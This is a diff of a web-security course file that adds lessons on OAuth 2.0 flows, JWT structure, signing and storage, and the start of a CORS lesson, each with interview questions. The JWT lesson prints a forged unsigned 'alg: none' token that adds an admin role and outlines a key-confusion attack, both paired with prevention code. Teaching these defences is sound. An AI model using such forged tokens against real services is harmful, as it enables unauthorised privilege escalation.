+                            <div class="code-block">❌ BAD: Ignore state parameter
+Vulnerable to CSRF attacks
+
+✅ GOOD: Generate, store, and validate state
+Prevents attackers from hijacking authorization</div>
+
+                            <h3>3. Storing Tokens Insecurely</h3>
+                            <div class="code-block">❌ BAD: localStorage.setItem('token', accessToken)
+Vulnerable to XSS attacks
+
+✅ GOOD:
+- Keep in memory (expires on tab close)
+- Use httpOnly cookies (if same domain)
+- Secure backend storage for refresh tokens</div>
+
+                            <h2>Summary</h2>
+                            <p>OAuth 2.0 enables secure delegated authorization:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Google OAuth "Sign in with Google"</li>
-                                <li>GitHub OAuth for apps</li>
-                                <li>Spotify API OAuth flows</li>
-                                <li>Sequence diagrams for each flow</li>
+                                <li><strong>Authorization Code Flow:</strong> Most secure, for web apps with backend</li>
+                                <li><strong>Auth Code + PKCE:</strong> For mobile apps and SPAs</li>
+                                <li><strong>Client Credentials:</strong> For machine-to-machine</li>
+                                <li><strong>Device Flow:</strong> For limited-input devices</li>
+                                <li>Access tokens are short-lived, refresh tokens are long-lived</li>
+                                <li>Use HTTPS always, validate redirect URIs, use state parameter</li>
+                                <li>Scopes define permissions, request incrementally</li>
+                                <li>Never use Implicit Flow (deprecated)</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What problem does OAuth 2.0 solve and why shouldn't you just share passwords?",
+                                answer: "OAuth solves delegated authorization - letting apps access your data without sharing passwords. Sharing passwords: gives full account access, can't revoke specific app access, password stored by third party, security risk if app compromised. OAuth: app gets limited-scope token, user can revoke anytime, password never shared, token expires automatically. Example: Photo Printer accessing Google Photos via token instead of Google password."
+                            },
+                            {
+                                question: "What's the difference between Authorization Code Flow and Authorization Code Flow with PKCE? When should you use each?",
+                                answer: "Standard Auth Code: Uses client_secret to exchange code for token. For web apps with secure backend that can store secret. PKCE (Proof Key for Code Exchange): Uses dynamically generated code_verifier instead of static client_secret. For public clients (mobile apps, SPAs) that can't securely store secrets. PKCE generates unique verifier per request, so intercepted code is useless without original verifier. Modern recommendation: Always use PKCE for public clients."
+                            },
+                            {
+                                question: "Why is the Implicit Flow deprecated and what should you use instead?",
+                                answer: "Implicit Flow (response_type=token) returns access token directly in URL fragment. Problems: token exposed in browser history, visible to JavaScript (XSS risk), no refresh token support, less secure. Modern replacement: Authorization Code Flow with PKCE. Same security as backend apps but works for SPAs/mobile. PKCE solves the client_secret problem for public clients. All new SPAs should use Auth Code + PKCE, not Implicit."
+                            },
+                            {
+                                question: "What are access tokens and refresh tokens? Why have both?",
+                                answer: "Access token: Short-lived (15min-1hr), grants API access, sent with each request. Refresh token: Long-lived (days/months), used to get new access tokens, stored securely. Why both: Short access token limits damage if stolen. Long refresh token avoids constant re-authentication. If access token stolen, attacker has limited time. Refresh token in secure storage reduces exposure. Example: Access token stolen from memory, expires in 1 hour. Refresh token in encrypted database, attacker can't access."
+                            },
+                            {
+                                question: "What is the state parameter in OAuth and why is it critical for security?",
+                                answer: "State is random string client generates and includes in authorization request. Server echoes it back in callback. Client validates received state matches sent state. Prevents CSRF attacks where attacker tricks user into authorizing attacker's account. Example attack without state: Attacker creates authorization link with their client_id, tricks user into clicking, user authorizes, code goes to attacker. With state: Client generates random state, stores it, validates on callback. Attacker can't forge valid state."
+                            },
+                            {
+                                question: "How does the Device Flow work and when should you use it?",
+                                answer: "Device Flow for limited-input devices (smart TV, IoT, CLI). Steps: 1) Device requests device_code and user_code, 2) Shows user: 'Visit url.com and enter: WDJB-MJHT', 3) User enters code on phone/computer, 4) Device polls token endpoint until user approves. Use for: smart TVs, IoT devices, CLI tools (GitHub CLI), printers. Alternative to opening browser on device with no keyboard. Real example: YouTube on TV shows code, you enter on phone."
+                            }
+                        ]
                     },
                     {
                         id: 'jwt',
                         title: 'JWT (JSON Web Tokens)',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: JWT</h2>
+                            <h2>What is JWT?</h2>
+                            <p>JWT (JSON Web Token) is a compact, URL-safe token format used for securely transmitting information between parties. It's widely used for authentication and information exchange in modern APIs.</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>JWT Structure</strong>
-                                    - Header (algorithm, type)
-                                    - Payload (claims: iss, sub, exp, iat, custom)
-                                    - Signature (verification)
-                                    - Base64URL encoding
-                                </li>
-                                <li><strong>JWT vs Sessions</strong>
-                                    - Stateless vs stateful
-                                    - Scalability implications
-                                    - Trade-offs
-                                </li>
-                                <li><strong>JWT Security</strong>
-                                    - Signing algorithms (HS256 vs RS256)
-                                    - Token expiration
-                                    - Refresh token patterns
-                                    - Common vulnerabilities (algorithm none, key confusion)
-                                </li>
-                                <li><strong>Implementation</strong>
-                                    - Generating JWTs
-                                    - Verifying JWTs
-                                    - Token storage (localStorage vs httpOnly cookies)
-                                    - Token refresh strategies
-                                </li>
-                                <li><strong>Best Practices</strong>
-                                    - Short expiration times
-                                    - Don't store sensitive data in JWT
-                                    - Verify signature always
-                                    - Use secure algorithms
-                                </li>
-                            </ul>
+                            <h3>The Problem JWT Solves</h3>
+                            <div class="code-block">Traditional Session-Based Auth:
+1. User logs in → Server creates session → Stores in database
+2. Server returns session ID in cookie
+3. Every request: Server looks up session in database
+4. Logout: Delete session from database
 
-                            <h3>Examples to Include:</h3>
+Problems at scale:
+❌ Database lookup on every request (slow)
+❌ Hard to scale horizontally (session store)
+❌ Tight coupling between auth server and resource server
+
+JWT Alternative:
+1. User logs in → Server creates JWT → Signs it
+2. Server returns JWT (no database storage)
+3. Every request: Server verifies JWT signature (no DB lookup)
+4. Logout: Client discards JWT (or use blacklist)
+
+Benefits:
+✅ No database lookup (faster)
+✅ Stateless (easy to scale)
+✅ Decoupled services (microservices-friendly)
+✅ Works across domains</div>
+
+                            <h2>JWT Structure</h2>
+                            <p>A JWT consists of three parts separated by dots (.)</p>
+
+                            <div class="code-block">JWT Format:
+HEADER.PAYLOAD.SIGNATURE
+
+Example JWT:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+Each part is Base64URL encoded JSON</div>
+
+                            <h3>1. Header</h3>
+                            <div class="code-block">Contains metadata about the token
+
+{
+  "alg": "HS256",     // Signing algorithm (HMAC SHA256)
+  "typ": "JWT"        // Token type
+}
+
+Common algorithms:
+- HS256: HMAC with SHA-256 (symmetric, shared secret)
+- RS256: RSA with SHA-256 (asymmetric, public/private key)
+- ES256: ECDSA with SHA-256 (asymmetric, elliptic curve)
+
+Base64URL encoded: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</div>
+
+                            <h3>2. Payload (Claims)</h3>
+                            <div class="code-block">Contains the actual data (claims)
+
+{
+  "sub": "1234567890",           // Subject (user ID)
+  "name": "John Doe",            // Custom claim
+  "iat": 1516239022,             // Issued At (timestamp)
+  "exp": 1516242622,             // Expiration (timestamp)
+  "iss": "https://auth.example.com",  // Issuer
+  "aud": "https://api.example.com"    // Audience
+}
+
+Standard claims (optional but recommended):
+- iss (issuer): Who created the token
+- sub (subject): Who the token is about (usually user ID)
+- aud (audience): Who the token is for (API identifier)
+- exp (expiration): When token expires (Unix timestamp)
+- iat (issued at): When token was created
+- jti (JWT ID): Unique identifier for this token
+
+Custom claims:
+You can add any data you want:
+- name, email, role, permissions, etc.
+
+⚠️ WARNING: JWT payload is NOT encrypted, only encoded!
+Anyone can decode and read it (use jwt.io)
+Never put sensitive data (passwords, credit cards) in JWT!</div>
+
+                            <h3>3. Signature</h3>
+                            <div class="code-block">Ensures token hasn't been tampered with
+
+How it's created (HS256):
+HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)
+
+Example:
+const signature = crypto
+  .createHmac('sha256', 'your-secret-key')
+  .update(encodedHeader + '.' + encodedPayload)
+  .digest('base64url');
+
+The signature proves:
+✅ Token was created by someone with the secret key
+✅ Token hasn't been modified
+
+If attacker changes payload, signature won't match!</div>
+
+                            <h2>JWT vs Session-Based Authentication</h2>
+
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Aspect</th>
+                                        <th>Sessions</th>
+                                        <th>JWT</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Storage</strong></td>
+                                        <td>Server stores session data</td>
+                                        <td>No server storage (stateless)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Lookup</strong></td>
+                                        <td>Database query every request</td>
+                                        <td>Signature verification only</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Scalability</strong></td>
+                                        <td>Hard (shared session store)</td>
+                                        <td>Easy (no shared state)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Revocation</strong></td>
+                                        <td>Easy (delete from database)</td>
+                                        <td>Hard (need blacklist or short expiry)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Size</strong></td>
+                                        <td>Small (just session ID)</td>
+                                        <td>Large (contains all claims)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Cross-domain</strong></td>
+                                        <td>Hard (cookie restrictions)</td>
+                                        <td>Easy (send in header)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h3>When to Use JWT</h3>
+                            <div class="code-block">✅ Use JWT when:
+- Building microservices (stateless)
+- Mobile apps (no cookies)
+- Single Page Applications
+- Cross-domain authentication
+- API Gateway architecture
+- High scalability needed
+
+❌ Don't use JWT when:
+- Need instant revocation (admin ban)
+- Long-lived sessions (30+ days)
+- Very frequent token validation
+- Simple single-server app</div>
+
+                            <h2>JWT Security: Signing Algorithms</h2>
+
+                            <h3>HS256 (HMAC with SHA-256)</h3>
+                            <div class="code-block">Symmetric algorithm - same secret for signing and verifying
+
+// Signing (auth server)
+const jwt = require('jsonwebtoken');
+const token = jwt.sign(
+  { userId: 123, role: 'admin' },
+  'super-secret-key',
+  { algorithm: 'HS256', expiresIn: '1h' }
+);
+
+// Verifying (API server)
+const decoded = jwt.verify(token, 'super-secret-key');
+
+Pros:
+✅ Faster than asymmetric algorithms
+✅ Simpler to implement
+
+Cons:
+❌ Same key for sign and verify (both servers need secret)
+❌ If API server compromised, attacker can create tokens
+❌ Hard to rotate keys
+
+Use for: Single service, auth and API in same codebase</div>
+
+                            <h3>RS256 (RSA with SHA-256)</h3>
+                            <div class="code-block">Asymmetric algorithm - private key signs, public key verifies
+
+// Signing (auth server) - uses PRIVATE key
+const privateKey = fs.readFileSync('private.pem');
+const token = jwt.sign(
+  { userId: 123, role: 'admin' },
+  privateKey,
+  { algorithm: 'RS256', expiresIn: '1h' }
+);
+
+// Verifying (API server) - uses PUBLIC key
+const publicKey = fs.readFileSync('public.pem');
+const decoded = jwt.verify(token, publicKey);
+
+Pros:
+✅ API servers can't create tokens (only public key)
+✅ Better security if API server compromised
+✅ Easy key rotation (just update public keys)
+✅ Multiple services can verify (distribute public key)
+
+Cons:
+❌ Slower than HS256
+❌ More complex key management
+
+Use for: Microservices, separate auth server, distributed systems
+
+Real example: Auth0, Firebase use RS256</div>
+
+                            <h2>Common JWT Vulnerabilities</h2>
+
+                            <h3>1. Algorithm None Attack</h3>
+                            <div class="code-block">❌ ATTACK: Change algorithm to "none", remove signature
+
+Original JWT:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyM30.signature
+
+Attacker modifies header:
+{
+  "alg": "none",  // ← Changed!
+  "typ": "JWT"
+}
+
+{
+  "userId": 123,
+  "role": "admin"  // ← Added admin!
+}
+
+Malicious JWT:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIn0.
+
+✅ PREVENTION:
+// Explicitly specify allowed algorithms
+jwt.verify(token, secret, {
+  algorithms: ['HS256']  // Don't allow 'none'!
+});
+
+// Never do this:
+jwt.verify(token, secret);  // Uses algorithm from JWT header!</div>
+
+                            <h3>2. Key Confusion Attack (RS256 → HS256)</h3>
+                            <div class="code-block">❌ ATTACK: Change RS256 to HS256, sign with public key
+
+Setup:
+- Auth server signs with RS256 (private key)
+- API server verifies with RS256 (public key)
+
+Attack:
+1. Attacker gets public key (usually public!)
+2. Changes JWT header alg to HS256
+3. Signs JWT with public key as HMAC secret
+4. API server verifies with HS256 using public key as secret
+   → Signature valid! ✅ (but shouldn't be)
+
+✅ PREVENTION:
+// Whitelist algorithms
+jwt.verify(token, publicKey, {
+  algorithms: ['RS256']  // Only RS256!
+});
+
+// Never use generic verification</div>
+
+                            <h3>3. Weak Secret Key</h3>
+                            <div class="code-block">❌ BAD: Weak secrets can be brute-forced
+
+const token = jwt.sign(payload, 'secret', { algorithm: 'HS256' });
+const token = jwt.sign(payload, '12345', { algorithm: 'HS256' });
+
+Attacker can brute-force weak secrets and create valid tokens!
+
+✅ GOOD: Strong random secrets
+const crypto = require('crypto');
+const secret = crypto.randomBytes(64).toString('hex');
+// e.g., a8f5f167f44f4964e6c998dee827110c03a0c039bc...
+
+Minimum: 256 bits (32 bytes) for HS256</div>
+
+                            <h2>JWT Implementation Patterns</h2>
+
+                            <h3>Generating JWTs</h3>
+                            <div class="code-block">// Node.js with jsonwebtoken library
+const jwt = require('jsonwebtoken');
+
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+
+  // Authenticate user
+  const user = await User.findOne({ username });
+  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Create JWT
+  const payload = {
+    sub: user.id,
+    username: user.username,
+    role: user.role,
+    iat: Math.floor(Date.now() / 1000)
+  };
+
+  const token = jwt.sign(payload, process.env.JWT_SECRET, {
+    algorithm: 'HS256',
+    expiresIn: '1h'  // Token expires in 1 hour
+  });
+
+  res.json({ token });
+});</div>
+
+                            <h3>Verifying JWTs</h3>
+                            <div class="code-block">// Middleware to protect routes
+function authenticateToken(req, res, next) {
+  // Get token from Authorization header
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"
+
+  if (!token) {
+    return res.status(401).json({ error: 'No token provided' });
+  }
+
+  try {
+    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
+      algorithms: ['HS256']
+    });
+
+    // Verify expiration (library does this automatically)
+    // Add user info to request
+    req.user = decoded;
+    next();
+  } catch (err) {
+    if (err.name === 'TokenExpiredError') {
+      return res.status(401).json({ error: 'Token expired' });
+    }
+    return res.status(403).json({ error: 'Invalid token' });
+  }
+}
+
+// Protected route
+app.get('/api/protected', authenticateToken, (req, res) => {
+  res.json({ message: `Hello ${req.user.username}` });
+});</div>
+
+                            <h3>Token Storage on Client</h3>
+
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Storage</th>
+                                        <th>Pros</th>
+                                        <th>Cons</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>localStorage</strong></td>
+                                        <td>Persists across tabs<br/>Easy to use</td>
+                                        <td>Vulnerable to XSS<br/>Accessible to any script</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>sessionStorage</strong></td>
+                                        <td>Cleared on tab close<br/>Somewhat safer</td>
+                                        <td>Still vulnerable to XSS<br/>Lost on tab close</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Memory (variable)</strong></td>
+                                        <td>Not accessible to XSS<br/>Most secure</td>
+                                        <td>Lost on refresh<br/>Complex to implement</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>httpOnly Cookie</strong></td>
+                                        <td>Not accessible to JS<br/>Sent automatically</td>
+                                        <td>CSRF risk (need token)<br/>Same-origin only</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <div class="code-block">❌ BAD: localStorage (XSS vulnerable)
+localStorage.setItem('token', token);
+// Any script can access: localStorage.getItem('token')
+
+✅ BETTER: httpOnly Cookie (if same domain)
+res.cookie('token', token, {
+  httpOnly: true,   // Can't access via JavaScript
+  secure: true,     // HTTPS only
+  sameSite: 'strict' // CSRF protection
+});
+
+✅ BEST: Memory + Refresh Token pattern
+// Keep access token in memory (expires on refresh)
+// Store refresh token in httpOnly cookie
+// Use refresh token to get new access token</div>
+
+                            <h3>Refresh Token Pattern</h3>
+                            <div class="code-block">Problem: Short-lived access tokens need frequent renewal
+Solution: Long-lived refresh tokens to get new access tokens
+
+Flow:
+1. Login → Get access token (15min) + refresh token (7 days)
+2. Use access token for API calls
+3. Access token expires → Use refresh token to get new one
+4. Repeat until refresh token expires → Re-login
+
+// Login endpoint
+app.post('/login', async (req, res) => {
+  const user = await authenticateUser(req.body);
+
+  const accessToken = jwt.sign(
+    { userId: user.id },
+    ACCESS_TOKEN_SECRET,
+    { expiresIn: '15m' }
+  );
+
+  const refreshToken = jwt.sign(
+    { userId: user.id },
+    REFRESH_TOKEN_SECRET,
+    { expiresIn: '7d' }
+  );
+
+  // Store refresh token in database
+  await RefreshToken.create({ token: refreshToken, userId: user.id });
+
+  res.json({ accessToken, refreshToken });
+});
+
+// Refresh endpoint
+app.post('/refresh', async (req, res) => {
+  const { refreshToken } = req.body;
+
+  if (!refreshToken) return res.sendStatus(401);
+
+  // Verify refresh token exists in database
+  const storedToken = await RefreshToken.findOne({ token: refreshToken });
+  if (!storedToken) return res.sendStatus(403);
+
+  try {
+    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);
+
+    // Create new access token
+    const accessToken = jwt.sign(
+      { userId: decoded.userId },
+      ACCESS_TOKEN_SECRET,
+      { expiresIn: '15m' }
+    );
+
+    res.json({ accessToken });
+  } catch (err) {
+    return res.sendStatus(403);
+  }
+});
+
+// Logout endpoint
+app.post('/logout', async (req, res) => {
+  const { refreshToken } = req.body;
+  // Delete refresh token from database
+  await RefreshToken.deleteOne({ token: refreshToken });
+  res.sendStatus(204);
+});</div>
+
+                            <h2>Real-World JWT Examples</h2>
+
+                            <h3>Auth0 JWT</h3>
+                            <div class="code-block">Auth0 uses RS256 with public key verification
+
+Example JWT from Auth0:
+{
+  "iss": "https://YOUR_DOMAIN.auth0.com/",
+  "sub": "auth0|507f1f77bcf86cd799439011",
+  "aud": "https://api.yourapp.com",
+  "iat": 1516239022,
+  "exp": 1516242622,
+  "azp": "your_client_id",
+  "scope": "openid profile email"
+}
+
+Verify with Auth0's public key:
+const jwksClient = require('jwks-rsa');
+const jwt = require('jsonwebtoken');
+
+const client = jwksClient({
+  jwksUri: 'https://YOUR_DOMAIN.auth0.com/.well-known/jwks.json'
+});
+
+function getKey(header, callback) {
+  client.getSigningKey(header.kid, (err, key) => {
+    const signingKey = key.publicKey || key.rsaPublicKey;
+    callback(null, signingKey);
+  });
+}
+
+jwt.verify(token, getKey, {
+  audience: 'https://api.yourapp.com',
+  issuer: 'https://YOUR_DOMAIN.auth0.com/',
+  algorithms: ['RS256']
+}, (err, decoded) => {
+  if (err) return console.error(err);
+  console.log(decoded);
+});</div>
+
+                            <h3>Firebase JWT (ID Tokens)</h3>
+                            <div class="code-block">Firebase uses RS256 with Google's public keys
+
+Example Firebase ID token:
+{
+  "iss": "https://securetoken.google.com/your-project-id",
+  "aud": "your-project-id",
+  "auth_time": 1516239022,
+  "user_id": "abcdef123456",
+  "sub": "abcdef123456",
+  "iat": 1516239022,
+  "exp": 1516242622,
+  "email": "user@example.com",
+  "email_verified": true,
+  "firebase": {
+    "identities": {
+      "google.com": ["109876543210987654321"],
+      "email": ["user@example.com"]
+    },
+    "sign_in_provider": "google.com"
+  }
+}
+
+Verify on backend:
+const admin = require('firebase-admin');
+admin.initializeApp();
+
+app.get('/api/data', async (req, res) => {
+  const idToken = req.headers.authorization.split('Bearer ')[1];
+
+  try {
+    const decodedToken = await admin.auth().verifyIdToken(idToken);
+    const uid = decodedToken.uid;
+    // User authenticated
+    res.json({ userId: uid });
+  } catch (error) {
+    res.status(401).json({ error: 'Unauthorized' });
+  }
+});</div>
+
+                            <h2>JWT Best Practices</h2>
+
+                            <h3>1. Keep Expiration Short</h3>
+                            <div class="code-block">❌ BAD: Long-lived tokens
+expiresIn: '30d'  // If stolen, attacker has 30 days!
+
+✅ GOOD: Short-lived access tokens
+expiresIn: '15m'  // 15 minutes
+
+Use refresh tokens for longer sessions</div>
+
+                            <h3>2. Don't Store Sensitive Data</h3>
+                            <div class="code-block">❌ BAD: Sensitive data in JWT
+{
+  "userId": 123,
+  "password": "secret123",        // ← Never!
+  "creditCard": "1234-5678-...",  // ← Never!
+  "ssn": "123-45-6789"           // ← Never!
+}
+
+JWT is encoded, NOT encrypted! Anyone can decode it.
+
+✅ GOOD: Only non-sensitive identifiers
+{
+  "userId": 123,
+  "username": "john",
+  "role": "user"
+}</div>
+
+                            <h3>3. Always Verify Signature</h3>
+                            <div class="code-block">❌ BAD: Trusting JWT without verification
+const payload = JSON.parse(
+  Buffer.from(token.split('.')[1], 'base64').toString()
+);
+// Attacker can forge this!
+
+✅ GOOD: Always verify signature
+const payload = jwt.verify(token, secret, {
+  algorithms: ['HS256']
+});</div>
+
+                            <h3>4. Use Secure Algorithms</h3>
+                            <div class="code-block">❌ NEVER use:
+- "none" algorithm
+- Weak secrets (short, predictable)
+- Deprecated algorithms
+
+✅ USE:
+- HS256 with strong secret (256+ bits)
+- RS256 with 2048+ bit keys
+- ES256 for performance + security</div>
+
+                            <h3>5. Implement Token Revocation</h3>
+                            <div class="code-block">JWT can't be revoked (stateless), but you can:
+
+Option 1: Blacklist (for logout/ban)
+await TokenBlacklist.create({ jti: token.jti, exp: token.exp });
+
+// In verification
+if (await TokenBlacklist.exists({ jti: decoded.jti })) {
+  return res.status(401).json({ error: 'Token revoked' });
+}
+
+Option 2: Short expiration + refresh tokens
+- Access token: 15 min (can't revoke, but expires quickly)
+- Refresh token: stored in DB, can be deleted
+
+Option 3: Version number
+User model: { tokenVersion: 5 }
+JWT payload: { userId: 123, version: 5 }
+
+// On password change or logout
+user.tokenVersion += 1;
+
+// Verification
+if (decoded.version !== user.tokenVersion) {
+  return res.status(401).json({ error: 'Token invalidated' });
+}</div>
+
+                            <h2>Summary</h2>
+                            <p>JWT provides stateless authentication for modern APIs:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>JWT anatomy (jwt.io visualization)</li>
-                                <li>Auth0 JWT implementation</li>
-                                <li>Firebase authentication</li>
-                                <li>Common JWT attacks and prevention</li>
+                                <li><strong>Structure:</strong> Header.Payload.Signature (Base64URL encoded)</li>
+                                <li><strong>Stateless:</strong> No database lookup needed (scales easily)</li>
+                                <li><strong>HS256:</strong> Symmetric (same secret), faster, simpler</li>
+                                <li><strong>RS256:</strong> Asymmetric (public/private keys), more secure, for microservices</li>
+                                <li>Never store sensitive data in JWT (it's encoded, not encrypted)</li>
+                                <li>Always verify signature with allowed algorithms</li>
+                                <li>Use short expiration (15min) + refresh tokens</li>
+                                <li>Beware: Algorithm none attack, key confusion, weak secrets</li>
+                                <li>Storage: Memory or httpOnly cookies (not localStorage)</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is JWT and how does it differ from session-based authentication?",
+                                answer: "JWT (JSON Web Token) is a self-contained token with encoded user data and signature. Session-based stores session data on server, requires database lookup per request. JWT: stateless (no DB lookup), scales easily, larger size (contains claims), hard to revoke. Sessions: stateful (DB storage), easy to revoke, smaller size (just ID), harder to scale. Use JWT for: microservices, mobile apps, high scalability. Use sessions for: simple apps, need instant revocation."
+                            },
+                            {
+                                question: "Explain the three parts of a JWT and why each is important.",
+                                answer: "Header: Contains algorithm (HS256/RS256) and token type (JWT). Tells verifier how to validate signature. Payload: Contains claims (sub, exp, iat, custom data). The actual user information. Base64 encoded but NOT encrypted - anyone can read it. Signature: Created by hashing header+payload with secret/private key. Proves token wasn't tampered with and was created by trusted party. All three parts are Base64URL encoded and joined with dots: header.payload.signature"
+                            },
+                            {
+                                question: "What's the difference between HS256 and RS256? When should you use each?",
+                                answer: "HS256 (HMAC SHA256): Symmetric algorithm, same secret key for signing and verifying. Faster, simpler. Problem: if API server compromised, attacker gets secret and can create tokens. Use for: single service, auth and API in same codebase. RS256 (RSA SHA256): Asymmetric, private key signs, public key verifies. API servers only have public key, can't create tokens. Better security for distributed systems. Slower, more complex. Use for: microservices, separate auth server, multiple services. Example: Auth0, Firebase use RS256."
+                            },
+                            {
+                                question: "What is the 'algorithm none' attack and how do you prevent it?",
+                                answer: "Attack: Attacker changes JWT header algorithm from HS256 to 'none', removes signature, modifies payload (e.g., add admin role). If server doesn't validate algorithm, it accepts the unsigned token. Prevention: Always specify allowed algorithms in verification: jwt.verify(token, secret, {algorithms: ['HS256']}). Never use generic verification that trusts the algorithm from the JWT header. Also vulnerable: Key confusion attack (changing RS256 to HS256, signing with public key as HMAC secret)."
+                            },
+                            {
+                                question: "Why shouldn't you store JWT in localStorage and what's the alternative?",
+                                answer: "localStorage vulnerable to XSS (Cross-Site Scripting). Any malicious script can access: localStorage.getItem('token'). If attacker injects script, they steal all tokens. Alternatives: 1) Memory (JS variable): Lost on refresh but safe from XSS. 2) httpOnly cookie: Can't access via JavaScript, sent automatically. Need CSRF protection. 3) Hybrid: Short access token in memory (15min) + refresh token in httpOnly cookie. Best security: Don't expose tokens to JavaScript."
+                            },
+                            {
+                                question: "How does the refresh token pattern work and why use it?",
+                                answer: "Problem: Short JWT expiration requires frequent re-authentication. Solution: Two tokens: Access token (short, 15min) for API calls + Refresh token (long, 7 days) to get new access tokens. Flow: Login → get both tokens. API calls use access token. When expired, use refresh token to get new access token. Benefits: Access token stolen? Only valid 15 minutes. Refresh token stored securely (httpOnly cookie or DB), less exposure. Can revoke refresh token in database for instant logout. Balance between security (short access token) and UX (long refresh token)."
+                            }
+                        ]
                     },
                     {
                         id: 'cors-security',
                         title: 'CORS & Security Headers',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: CORS & Security</h2>
+                            <h2>CORS (Cross-Origin Resource Sharing)</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>CORS (Cross-Origin Resource Sharing)</strong>
-                                    - What is CORS and why it exists
-                                    - Same-origin policy
-                                    - Simple vs preflighted requests
-                                    - CORS headers (Access-Control-Allow-Origin, etc.)
-                                    - Credentials and CORS
-                                </li>
-                                <li><strong>Security Headers</strong>
-                                    - Content-Security-Policy (CSP)
-                                    - X-Content-Type-Options
-                                    - X-Frame-Options
-                                    - Strict-Transport-Security (HSTS)
-                                    - X-XSS-Protection
-                                </li>
-                                <li><strong>Common Security Threats</strong>
-                                    - XSS (Cross-Site Scripting)
-                                    - CSRF (Cross-Site Request Forgery)
-                                    - Clickjacking
-                                    - Man-in-the-Middle attacks
-                                </li>
-                                <li><strong>API Security Best Practices</strong>
-                                    - Always use HTTPS
-                                    - Input validation and sanitization
-                                    - Rate limiting
-                                    - API versioning for security patches
-                                    - Security audits and penetration testing
-                                </li>
-                            </ul>
+                            <h3>What is CORS and Why Does it Exist?</h3>
+                            <p>CORS is a browser security mechanism that controls how web pages from one domain can access resources from another domain. It exists to protect users from malicious websites.</p>
 
-                            <h3>Examples to Include:</h3>
+                            <div class="code-block">The Problem (without CORS):
+You visit evil.com
+Evil.com's JavaScript can make requests to yourbank.com
+Your browser automatically sends your bank cookies!
+→ Evil.com could read your bank balance, transfer money, etc.
+
+Same-Origin Policy (SOP):
+Browser blocks cross-origin requests by default
+Origin = protocol + domain + port
+
+Same origin:
+https://api.example.com:443/users
+https://api.example.com:443/posts  ✅ Same
+
+Different origins:
+https://api.example.com ➜ http://api.example.com   ❌ (protocol)
+https://api.example.com ➜ https://api2.example.com ❌ (domain)
+https://api.example.com ➜ https://api.example.com:8080 ❌ (port)
+
+CORS allows server to selectively allow cross-origin requests</div>
+
+                            <h3>Simple Requests (No Preflight)</h3>
+                            <div class="code-block">Simple requests don't trigger CORS preflight
+
+Criteria for simple request:
+✅ Method: GET, HEAD, or POST
+✅ Headers: Only Accept, Accept-Language, Content-Language, Content-Type
+✅ Content-Type: application/x-www-form-urlencoded, multipart/form-data, or text/plain
+
+Example:
+// Frontend at https://app.example.com
+fetch('https://api.example.com/users')
+
+Browser automatically sends Origin header:
+GET /users HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+
+Server responds with CORS headers:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://app.example.com
+Content-Type: application/json
+
+{"users": [...]}
+
+If Access-Control-Allow-Origin missing or doesn't match:
+→ Browser blocks response from JavaScript
+→ Console error: "CORS policy: No 'Access-Control-Allow-Origin' header"</div>
+
+                            <h3>Preflight Requests (OPTIONS)</h3>
+                            <div class="code-block">Complex requests trigger preflight (browser asks permission first)
+
+Triggers preflight:
+❌ Custom headers (Authorization, X-API-Key)
+❌ Methods other than GET/HEAD/POST (PUT, DELETE, PATCH)
+❌ Content-Type: application/json
+
+Example: PUT request with JSON
+
+// Frontend
+fetch('https://api.example.com/users/123', {
+  method: 'PUT',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer token123'
+  },
+  body: JSON.stringify({ name: 'John' })
+});
+
+Step 1: Browser sends OPTIONS request (preflight)
+OPTIONS /users/123 HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: content-type,authorization
+
+Step 2: Server responds if allowed
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.example.com
